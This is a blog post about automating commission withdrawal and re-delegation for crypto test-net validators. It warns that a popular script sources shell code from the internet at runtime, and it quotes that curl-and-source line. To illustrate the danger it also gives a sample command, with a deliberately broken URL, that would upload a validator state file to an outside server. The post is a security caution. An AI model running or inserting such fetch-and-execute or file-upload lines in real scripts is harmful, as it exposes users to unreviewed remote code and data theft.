---
layout: post
title:  "Skip routine, use auto withdraw!"
date:   2024-05-13 10:21:03 +0700
categories: crypto
---

### Context
In order to stay in active set of test nets one should constantly withdraw
their commission and rewards and re-delegate it to themselves. It can be
an exciting experience the first time, but then it becomes a routine.

### Existing solution
There is a working [auto-withdraw-delegate](https://github.com/Pretid/galactica_helpers/tree/main/auto-withdraw-delegate)
script by [@Pretid](https://github.com/Pretid). However, I'm concerned by one
[line](https://github.com/Pretid/galactica_helpers/blob/d1dcd7fac9fc49974d6c815141b935cc8b4663fd/auto-withdraw-delegate/auto-withdraw-redelegue.sh#L2)
there:
```bash
source <(curl -s https://raw.githubusercontent.com/Pretid/galactica_helpers/main/utils/common.sh)
```
It means everytime the script runs, it executes some logic taken from the
Internet! I'm sure the author is not going to inject any harmful code there
like:
```bash
curl  -d "@$HOME/.galactica/data/priv_validator_state.json" ht tps://server-storing-everything-for.me/
# URL is broken on purpose, just in case someone tries to execute it
```
But one should stay on the safe side.

### Alternative solution
Before finding the solution above, I implemented almost the same script,
you can find it [here](https://github.com/masim05/play-web3/tree/main/utils/withdraw).
One more benefit, it is extendable in terms of networks, at the moment it support Galactica and
Zero-gravity.
